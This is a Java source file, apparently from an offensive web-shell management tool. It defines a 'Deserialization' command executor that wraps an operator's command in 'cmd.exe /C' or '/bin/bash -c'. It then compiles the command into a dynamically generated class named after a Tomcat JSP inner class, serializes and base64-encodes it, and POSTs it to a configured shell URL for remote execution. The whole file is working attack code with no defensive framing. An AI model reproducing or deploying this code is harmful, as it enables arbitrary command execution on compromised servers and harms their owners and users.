package com.feihong.executor;

import com.feihong.asm.GenerateDynamicClass;
import com.feihong.bean.CommandExecutionResult;
import com.feihong.util.BasicSetting;
import com.feihong.util.WrappedHttpRequest;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Base64;

public class DeserializationCommandExecutor extends ClassLoader implements CommandExecutor {
    @Override
    public String getName() {
        return "Deserialization";
    }

    @Override
    public CommandExecutionResult exec(String command) {

        String base64Encode = null;
        URL url = null;
        try {
            url = new URL(BasicSetting.getInstance().shellUrl);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        String className1 = transform(url.getPath(), "/");
        String className2 = transform(url.getPath(), ".");

        try{

            String wrappedCommand = null;
            GenerateDynamicClass dynamicClass;
            if(command.equalsIgnoreCase("ipconfig") || command.trim().equalsIgnoreCase("ifconfig")){
                dynamicClass = new GenerateDynamicClass(className1,command);
            }else{
                if(BasicSetting.getInstance().shellPlatform.trim().equalsIgnoreCase("windows")){
                    dynamicClass = new GenerateDynamicClass(className1,"cmd.exe,/C," + command);
                }else{
                    dynamicClass = new  GenerateDynamicClass(className1,"/bin/bash,-c," + command);
                }
            }

            Class clazz = new DeserializationCommandExecutor().defineClass(className2, dynamicClass.generate(), 0, dynamicClass.generate().length);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(clazz.newInstance());
            base64Encode = Base64.getEncoder().encodeToString(baos.toByteArray());

        }catch(Exception e){
            e.printStackTrace();
        }

        return WrappedHttpRequest.post(base64Encode);
    }

    public String transform(String str, String seperator){
        String path = str.substring(0, str.lastIndexOf("."));
        path = path.replaceAll("-","_002d");
        path = "org/apache/jsp" + path;
        path = path.replaceAll("/", seperator) + "_jsp$Gadget";
        return path;
    }
}
